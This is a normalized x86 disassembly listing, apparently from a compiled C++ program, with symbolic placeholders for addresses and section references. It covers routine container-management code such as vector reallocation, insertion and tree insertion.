mov [ ebp - 0x4 ] eax
shr edi 0x1f
add edi edx
mov [ ebp - 0x1a8 ] eax
lea eax [ edi + edi * 2 ]
shl eax 0x6
add eax ecx
mov [ ebp - 0x1a4 ] ecx
mov [ ebp - 0x1a0 ] 0x0
mov ecx [ ebp - 0x1a0 ]
mov edx [ ebp - 0x1a0 ]
push ecx
mov ecx [ ebp - 0x1ac ]
push edx
push eax
mov edx 0x1
mov [ ebp - 0x1b0 ] edi
call sub_412890
mov ecx [ ebx + 0xc ]
add esp 0xc
mov [ ebp - 0x1a0 ] 0x0
mov eax [ ebp - 0x1a0 ]
mov edx [ ebp - 0x1a0 ]
push eax
mov eax [ ebp - 0x1a4 ]
push edx
mov edx [ ebp + 0x10 ]
push eax
push edx
mov [ ebp - 0x1a8 ] 0x1
call sub_412c20
mov ecx [ ebx + 0x10 ]
add esp 0x10
mov [ ebp - 0x1a0 ] 0x0
mov edx [ ebp - 0x1a0 ]
push edx
mov edx [ ebp - 0x1a0 ]
lea eax [ edi + edi * 2 + 0x3 ]
shl eax 0x6
add eax [ ebp - 0x1a4 ]
push edx
push eax
push ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x1a8 ] 0x2
call sub_412c20
mov edi [ ebx + 0x10 ]
mov ecx [ ebx + 0xc ]
mov edx edi
sub edx ecx
mov eax 0x2aaaaaab
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add esp 0x10
lea eax [ edx + eax + 0x1 ]
mov [ ebp - 0x1a0 ] eax
test ecx ecx
je r-xdata
mov esi eax
cmp esi eax
jae r-xdata
mov ecx [ ebp - 0x1a4 ]
lea edx [ esi + esi * 2 ]
lea eax [ eax + eax * 2 ]
shl edx 0x6
add edx ecx
shl eax 0x6
add eax ecx
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x10 ] eax
mov [ ebx + 0xc ] ecx
jmp r-xdata
mov eax ecx
call sub_410ba0
mov ecx [ ebx + 0xc ]
push ecx
call sub_43f960
mov eax [ ebp - 0x1a0 ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x18 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_410dae
cmp [ ebp - 0x1a8 ] 0x1
mov esi [ ebp - 0x1b0 ]
mov ebx [ ebp - 0x1a4 ]
jle r-xdata
cmp [ ebp - 0x1a8 ] 0x0
jle r-xdata
lea edi [ esi + esi * 2 ]
shl edi 0x6
add edi ebx
mov eax ebx
call sub_410ba0
push ebx
call sub_43f960
add esp 0x4
push 0x0
push 0x0
call sub_442eab
sub edi [ ebp + 0x10 ]
mov eax 0x2aaaaaab
imul edi
mov edi [ ebp - 0x1ac ]
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
jae r-xdata
lea edi [ esi + esi * 2 + 0x3 ]
lea eax [ esi + esi * 2 ]
shl edi 0x6
shl eax 0x6
add edi ebx
add eax ebx
call sub_410ba0
lea edx [ ebp - 0x19c ]
push edx
call sub_411f30
mov [ ebp - 0x4 ] 0x5
mov esi [ ebx + 0x10 ]
push esi
lea edi [ esi - 0xc0 ]
push edi
mov edx esi
call sub_412570
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1a0 ] 0x0
mov eax [ ebp - 0x1a0 ]
mov ecx [ ebp - 0x1a0 ]
mov edx [ ebp - 0x1a0 ]
push eax
push ecx
push edx
mov eax esi
mov ecx edi
call sub_412e40
mov ecx [ ebp + 0x10 ]
add esp 0xc
lea ebx [ ecx + 0xc0 ]
lea eax [ ebp - 0x19c ]
call sub_4125a0
lea esi [ ebp - 0x19c ]
lea edx [ ebp - 0xdc ]
push edx
call sub_411f30
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ eax + 0xc0 ]
push eax
call sub_412570
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0x10 ]
lea edx [ ebp - 0xdc ]
push edx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
call sub_410000
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0xc0
mov ebx [ ebx + 0x10 ]
mov ecx [ ebp + 0x10 ]
add ebx 0xffffff40
lea eax [ ebp - 0xdc ]
call sub_4125a0
lea esi [ ebp - 0xdc ]
jmp r-xdata
call sub_402480
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x18 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_410f70
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0xc0
jae r-xdata
xor ecx ecx
lea edx [ ecx + ecx * 2 ]
shl edx 0x6
push edx
call sub_43fa1d
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_43fa93
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_442eab
int3
sub_410fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_45aaa6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1d8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x18 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov ecx [ ebx + 0xc ]
mov [ ebp - 0x1d0 ] ebx
mov [ ebp - 0x1d8 ] eax
test ecx ecx
jne r-xdata
mov edx [ ebx + 0x14 ]
sub edx ecx
mov eax 0x4bda12f7
imul edx
sar edx 0x6
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
inc eax
cmp esi eax
jae r-xdata
call sub_411eb0
mov edi [ ebx + 0x10 ]
mov edx edi
sub edx ecx
mov eax 0x4bda12f7
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
mov ecx 0x12f684b
sub ecx eax
cmp ecx 0x1
jae r-xdata
sub edi [ ebp + 0x10 ]
mov eax 0x4bda12f7
imul edi
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
mov ecx [ ebp - 0x1d8 ]
jae r-xdata
mov ecx esi
shr ecx 0x1
mov edx 0x12f684b
sub edx ecx
cmp edx esi
jae r-xdata
lea edx [ ebp - 0x1cc ]
push edx
call sub_412070
mov [ ebp - 0x4 ] 0x5
mov edi [ ebx + 0x10 ]
push edi
lea esi [ edi - 0xd8 ]
push esi
mov edx edi
call sub_4125d0
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov eax esi
call sub_412600
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0xd8 ]
push eax
lea eax [ ebp - 0x1cc ]
call sub_412af0
lea eax [ ebp - 0x1cc ]
lea edx [ ebp - 0xf4 ]
push edx
call sub_412070
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ eax + 0xd8 ]
push eax
call sub_4125d0
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0x10 ]
lea edx [ ebp - 0xf4 ]
push edx
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
call sub_410100
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0xd8
mov ebx [ ebx + 0x10 ]
mov ecx [ ebp + 0x10 ]
add ebx 0xffffff28
push ebx
lea eax [ ebp - 0xf4 ]
call sub_412af0
lea eax [ ebp - 0xf4 ]
jmp r-xdata
add esi ecx
xor esi esi
jmp r-xdata
add esp 0x4
call sub_412bf0
mov ecx esi
call sub_411390
mov edx [ ebp + 0x10 ]
sub edx [ ebx + 0xc ]
mov ecx eax
mov eax 0x4bda12f7
imul edx
sar edx 0x6
mov edi edx
xor eax eax
mov [ ebp - 0x4 ] eax
shr edi 0x1f
add edi edx
mov [ ebp - 0x1dc ] eax
mov eax edi
imul eax eax 0xd8
add eax ecx
mov [ ebp - 0x1d4 ] ecx
mov [ ebp - 0x1d0 ] 0x0
mov ecx [ ebp - 0x1d0 ]
mov edx [ ebp - 0x1d0 ]
push ecx
mov ecx [ ebp - 0x1d8 ]
push edx
push eax
mov edx 0x1
mov [ ebp - 0x1e0 ] edi
call sub_412930
mov ecx [ ebx + 0xc ]
add esp 0xc
mov [ ebp - 0x1d0 ] 0x0
mov eax [ ebp - 0x1d0 ]
mov edx [ ebp - 0x1d0 ]
push eax
mov eax [ ebp - 0x1d4 ]
push edx
mov edx [ ebp + 0x10 ]
push eax
push edx
mov [ ebp - 0x1dc ] 0x1
call sub_412fa0
mov ecx [ ebx + 0x10 ]
lea eax [ edi + 0x1 ]
imul eax eax 0xd8
add eax [ ebp - 0x1d4 ]
add esp 0x10
mov [ ebp - 0x1d0 ] 0x0
mov edx [ ebp - 0x1d0 ]
push edx
mov edx [ ebp - 0x1d0 ]
push edx
push eax
push ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x1dc ] 0x2
call sub_412fa0
mov edi [ ebx + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx edi
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add esp 0x10
lea edx [ edx + eax + 0x1 ]
mov [ ebp - 0x1d0 ] edx
test edi edi
je r-xdata
mov esi eax
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x1d4 ]
imul esi esi 0xd8
imul edx edx 0xd8
add esi eax
add edx eax
mov [ ebx + 0x14 ] esi
mov [ ebx + 0x10 ] edx
mov [ ebx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x1d0 ]
mov eax [ ebx + 0x10 ]
push ecx
push eax
push edi
call sub_412a80
mov edx [ ebx + 0xc ]
add esp 0xc
push edx
call sub_43f960
mov edx [ ebp - 0x1d0 ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x18 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_4111cc
mov ebx [ ebp - 0x1dc ]
cmp ebx 0x1
mov esi [ ebp - 0x1e0 ]
mov edi [ ebp - 0x1d4 ]
jle r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x1d0 ]
mov ecx esi
imul ecx ecx 0xd8
push eax
add ecx edi
push ecx
push edi
call sub_412a80
add esp 0xc
push edi
call sub_43f960
add esp 0x4
push 0x0
push 0x0
call sub_442eab
sub edi [ ebp + 0x10 ]
mov eax 0x4bda12f7
imul edi
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
mov ecx [ ebp - 0x1d8 ]
jae r-xdata
mov edx [ ebp - 0x1d0 ]
lea eax [ esi + 0x1 ]
imul esi esi 0xd8
imul eax eax 0xd8
push edx
add eax edi
push eax
add esi edi
push esi
call sub_412a80
add esp 0xc
lea edx [ ebp - 0x1cc ]
push edx
call sub_412070
mov [ ebp - 0x4 ] 0x5
mov edi [ ebx + 0x10 ]
push edi
lea esi [ edi - 0xd8 ]
push esi
mov edx edi
call sub_4125d0
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov eax esi
call sub_412600
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0xd8 ]
push eax
lea eax [ ebp - 0x1cc ]
call sub_412af0
lea eax [ ebp - 0x1cc ]
lea edx [ ebp - 0xf4 ]
push edx
call sub_412070
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ eax + 0xd8 ]
push eax
call sub_4125d0
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebp + 0x10 ]
lea edx [ ebp - 0xf4 ]
push edx
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
call sub_410100
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0xd8
mov ebx [ ebx + 0x10 ]
mov ecx [ ebp + 0x10 ]
add ebx 0xffffff28
push ebx
lea eax [ ebp - 0xf4 ]
call sub_412af0
lea eax [ ebp - 0xf4 ]
jmp r-xdata
add esp 0x4
call sub_412bf0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x18 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_411390
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0xd8
jae r-xdata
xor ecx ecx
imul ecx ecx 0xd8
push ecx
call sub_43fa1d
add esp 0x4
add esp 0x10
retn
lea eax [ esp ]
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4 ] 0x0
call sub_43fa93
push r--data
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] r--data
call sub_442eab
int3
sub_4113f0
push ebp
mov ebp esp
push 0xffffffff
push sub_45a2b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x50 ] ebx
test eax eax
jne r-xdata
mov ecx [ ebx + 0x14 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
inc eax
cmp esi eax
jae r-xdata
call sub_411920
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx [ ebx + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov ecx 0x9249249
sub ecx eax
cmp ecx 0x1
jae r-xdata
sub edi [ ebp + 0x10 ]
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
mov eax [ ebp - 0x5c ]
jae r-xdata
mov ecx esi
shr ecx 0x1
mov edx 0x9249249
sub edx ecx
cmp edx esi
jae r-xdata
lea esi [ ebp - 0x4c ]
call sub_412150
mov [ ebp - 0x4 ] 0x5
mov edi [ ebx + 0x10 ]
push edi
lea esi [ edi - 0x1c ]
push esi
mov edx edi
call sub_412650
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov eax esi
call sub_412680
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x4c ]
push ecx
lea ebx [ eax + 0x1c ]
call sub_412b70
lea esi [ ebp - 0x4c ]
lea esi [ ebp - 0x30 ]
call sub_412150
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ eax + 0x1c ]
push eax
call sub_412650
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov edx esi
mov ecx edi
sub ecx [ ebp + 0x10 ]
push edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
call sub_410210
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0x1c
mov ebx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x30 ]
push ecx
add ebx 0xffffffe4
call sub_412b70
lea esi [ ebp - 0x30 ]
jmp r-xdata
add esi ecx
xor esi esi
jmp r-xdata
add esp 0x4
call sub_412bc0
test esi esi
ja r-xdata
mov esi eax
cmp esi eax
jae r-xdata
mov ecx esi
call sub_429880
push 0x0
call sub_43fa1d
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x54 ]
lea ecx [ esi * 8 ]
sub ecx esi
lea ecx [ eax + ecx * 4 ]
mov [ ebx + 0x14 ] ecx
lea ecx [ edx * 8 ]
sub ecx edx
lea edx [ eax + ecx * 4 ]
mov [ ebx + 0x10 ] edx
mov [ ebx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x50 ]
mov eax [ ebx + 0xc ]
push ecx
call sub_412b30
mov edx [ ebx + 0xc ]
push edx
call sub_43f960
mov edx [ ebp - 0x50 ]
add esp 0x8
mov ecx [ ebp + 0x10 ]
sub ecx [ ebx + 0xc ]
mov [ ebp - 0x54 ] eax
mov eax 0x92492493
imul ecx
add edx ecx
mov ecx [ ebp - 0x54 ]
sar edx 0x4
mov edi edx
xor eax eax
mov [ ebp - 0x4 ] eax
shr edi 0x1f
add edi edx
mov [ ebp - 0x58 ] eax
lea eax [ edi * 8 ]
sub eax edi
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x50 ] 0x0
mov edx [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
push edx
push ecx
mov ecx [ ebp - 0x5c ]
push eax
mov edx 0x1
mov [ ebp - 0x60 ] edi
call sub_4129f0
mov edx [ ebx + 0xc ]
add esp 0xc
mov [ ebp - 0x50 ] 0x0
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x54 ]
push ecx
mov ecx [ ebp + 0x10 ]
push eax
mov [ ebp - 0x58 ] 0x1
call sub_413050
mov eax [ ebp - 0x54 ]
mov ecx [ ebx + 0x10 ]
inc edi
lea edx [ edi * 8 ]
sub edx edi
lea eax [ eax + edx * 4 ]
add esp 0xc
mov [ ebp - 0x50 ] 0x0
mov edx [ ebp - 0x50 ]
push edx
mov edx [ ebp - 0x50 ]
push edx
mov edx [ ebp + 0x10 ]
push eax
mov [ ebp - 0x58 ] 0x2
call sub_413050
mov edi [ ebx + 0x10 ]
mov eax [ ebx + 0xc ]
mov ecx edi
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add esp 0xc
cmp [ ebx + 0xc ] 0x0
lea edx [ edx + eax + 0x1 ]
mov [ ebp - 0x50 ] edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_4115c9
cmp [ ebp - 0x58 ] 0x1
mov esi [ ebp - 0x60 ]
mov ebx [ ebp - 0x54 ]
jle r-xdata
cmp [ ebp - 0x58 ] 0x0
jle r-xdata
mov eax [ ebp - 0x50 ]
lea ecx [ esi * 8 ]
sub ecx esi
push eax
lea edi [ ebx + ecx * 4 ]
mov eax ebx
call sub_412b30
add esp 0x4
push ebx
call sub_43f960
add esp 0x4
push 0x0
push 0x0
call sub_442eab
sub edi [ ebp + 0x10 ]
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
mov eax [ ebp - 0x5c ]
jae r-xdata
mov edx [ ebp - 0x50 ]
lea eax [ esi + 0x1 ]
push edx
lea ecx [ eax * 8 ]
sub ecx eax
lea edx [ esi * 8 ]
sub edx esi
lea edi [ ebx + ecx * 4 ]
lea eax [ ebx + edx * 4 ]
call sub_412b30
add esp 0x4
lea esi [ ebp - 0x4c ]
call sub_412150
mov [ ebp - 0x4 ] 0x5
mov edi [ ebx + 0x10 ]
push edi
lea esi [ edi - 0x1c ]
push esi
mov edx edi
call sub_412650
mov [ ebx + 0x10 ] eax
mov ebx [ ebp + 0x10 ]
mov eax esi
call sub_412680
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x4c ]
push ecx
lea ebx [ eax + 0x1c ]
call sub_412b70
lea esi [ ebp - 0x4c ]
lea esi [ ebp - 0x30 ]
call sub_412150
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
push ecx
lea edx [ eax + 0x1c ]
push eax
call sub_412650
mov [ ebp - 0x4 ] 0x3
mov edi [ ebx + 0x10 ]
mov edx esi
mov ecx edi
sub ecx [ ebp + 0x10 ]
push edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0x1
sub esi eax
call sub_410210
mov [ ebp - 0x4 ] 0x2
add [ ebx + 0x10 ] 0x1c
mov ebx [ ebx + 0x10 ]
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x30 ]
push ecx
add ebx 0xffffffe4
call sub_412b70
lea esi [ ebp - 0x30 ]
jmp r-xdata
add esp 0x4
call sub_412bc0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0xc
sub_411750
sub esp 0x8
push ebx
push ebp
mov ebx eax
mov edx [ ebx + 0xc ]
push esi
push edi
test edx edx
jne r-xdata
mov eax [ ebx + 0x14 ]
sub eax edx
sar eax 0x2
mov ecx eax
xor ecx ecx
jmp r-xdata
inc eax
cmp ecx eax
jae r-xdata
call sub_411920
mov esi [ ebx + 0x10 ]
mov eax esi
sub eax edx
sar eax 0x2
mov edx 0x3fffffff
sub edx eax
cmp edx 0x1
jae r-xdata
mov edi [ esp + 0x24 ]
mov ecx esi
sub ecx edi
sar ecx 0x2
mov eax esi
cmp ecx 0x1
jae r-xdata
mov edx ecx
shr edx 0x1
mov esi 0x3fffffff
sub esi edx
cmp esi ecx
jae r-xdata
mov ecx [ esp + 0x1c ]
mov ebp [ ecx ]
lea edi [ esi - 0x4 ]
mov edx esi
call sub_4126e0
mov [ ebx + 0x10 ] eax
mov eax [ esp + 0x24 ]
sub edi eax
sar edi 0x2
test edi edi
jle r-xdata
mov edx [ esp + 0x1c ]
mov ebp [ edx ]
lea edx [ edi + 0x4 ]
mov [ esp + 0x1c ] ebp
call sub_4126e0
mov edi [ ebx + 0x10 ]
mov eax edi
sub eax [ esp + 0x24 ]
mov esi 0x1
sar eax 0x2
sub esi eax
lea edx [ esp + 0x1c ]
call sub_4102f0
add [ ebx + 0x10 ] 0x4
mov ebx [ ebx + 0x10 ]
mov eax [ esp + 0x24 ]
lea ecx [ ebx - 0x4 ]
cmp eax ecx
je r-xdata
add ecx edx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x10 ]
jmp r-xdata
lea ecx [ eax + 0x4 ]
cmp eax ecx
je r-xdata
lea ecx [ edi * 4 ]
push ecx
push eax
push ecx
sub esi ecx
push esi
call sub_43fbf5
mov eax [ esp + 0x34 ]
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0xc
mov [ eax ] ebp
add eax 0x4
cmp eax ecx
jne r-xdata
call sub_410680
mov ebp [ esp + 0x24 ]
sub ebp [ ebx + 0xc ]
mov edx [ esp + 0x1c ]
sar ebp 0x2
lea edi [ eax + ebp * 4 ]
mov esi 0x1
mov [ esp + 0x14 ] eax
call sub_4102f0
mov edx [ esp + 0x24 ]
mov ecx [ ebx + 0xc ]
mov edi [ esp + 0x14 ]
mov eax edx
sub eax ecx
sar eax 0x2
test eax eax
jbe r-xdata
mov [ esp + 0x10 ] eax
mov ecx eax
cmp ecx eax
jae r-xdata
mov [ eax ] ebp
add eax 0x4
cmp eax ecx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0xc
mov eax [ ebx + 0x10 ]
sub eax edx
sar eax 0x2
test eax eax
jbe r-xdata
add eax eax
add eax eax
push eax
push ecx
push eax
push edi
call sub_43fbf5
mov edx [ esp + 0x34 ]
add esp 0x10
mov eax [ ebx + 0xc ]
mov esi [ ebx + 0x10 ]
sub esi eax
sar esi 0x2
inc esi
test eax eax
je r-xdata
add eax eax
add eax eax
push eax
push edx
push eax
lea eax [ edi + ebp * 4 + 0x4 ]
push eax
call sub_43fbf5
add esp 0x10
mov ecx [ esp + 0x10 ]
lea edx [ edi + ecx * 4 ]
lea eax [ edi + esi * 4 ]
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x10 ] eax
mov [ ebx + 0xc ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0xc
push eax
call sub_43f960
add esp 0x4
sub_411920
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_459c78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
push 0x12
push r--data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
call sub_42a180
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x5c ] 0x0
call sub_4296c0
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_442eab
int3
sub_4119a0
sub esp 0x10
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
mov edi [ ebx + 0x18 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov cl 0x1
mov [ esp + 0x20 ] cl
jne r-xdata
mov eax [ ebx ]
mov edx edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x10 ] eax
test cl cl
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ ecx ]
mov esi [ edx + 0xc ]
mov ecx [ esp + 0x24 ]
cmp esi [ ecx ]
jae r-xdata
mov edx [ ebx + 0x18 ]
mov esi [ edx ]
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
pop edi
mov [ ebp ] eax
pop esi
mov [ ebp + 0x8 ] 0x0
mov [ ebp + 0x4 ] edx
mov eax ebp
pop ebp
add esp 0x10
retn 0x8
push ecx
mov ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
push ebx
call sub_411a90
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp ] ecx
mov [ ebp + 0x8 ] 0x1
mov [ ebp + 0x4 ] edx
mov eax ebp
pop edi
pop esi
pop ebp
add esp 0x10
retn 0x8
call sub_4407b7
cmp eax eax
je r-xdata
cmp edx [ eax + 0xc ]
mov edi eax
setb cl
mov [ esp + 0x20 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea esi [ esp + 0x10 ]
call sub_424ee0
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov eax [ esp + 0x24 ]
push eax
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
push ebx
call sub_411a90
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x4 ] eax
mov [ ebp ] edx
mov [ ebp + 0x8 ] 0x1
mov eax ebp
pop edi
pop esi
pop ebp
add esp 0x10
retn 0x8
cmp edi esi
jne r-xdata
sub_411a90
push 0xffffffff
push sub_459b68
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x68 ]
cmp [ ebp + 0x1c ] 0x1ffffffe
jb r-xdata
mov eax [ ebp + 0x18 ]
mov esi [ esp + 0x74 ]
push eax
push edi
push eax
call sub_4121e0
inc [ ebp + 0x1c ]
mov esi eax
mov eax [ ebp + 0x18 ]
xor ebx ebx
mov [ esp + 0x68 ] esi
cmp edi eax
jne r-xdata
push 0x13
xor ebx ebx
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] bl
call sub_42a180
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] ebx
call sub_4296c0
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_442eab
cmp [ esp + 0x70 ] bl
je r-xdata
mov [ eax + 0x4 ] esi
mov edx [ ebp + 0x18 ]
mov [ edx ] esi
mov eax [ ebp + 0x18 ]
jmp r-xdata
mov [ edi + 0x8 ] esi
mov eax [ ebp + 0x18 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ edi ] esi
mov eax [ ebp + 0x18 ]
cmp edi [ eax ]
jne r-xdata
mov [ eax + 0x8 ] esi
mov ecx [ esi + 0x4 ]
lea eax [ esi + 0x4 ]
cmp [ ecx + 0x14 ] bl
jne r-xdata
mov [ eax ] esi
jmp r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ esp + 0x6c ]
mov ecx [ ebp ]
mov [ eax + 0x4 ] esi
mov [ eax ] ecx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
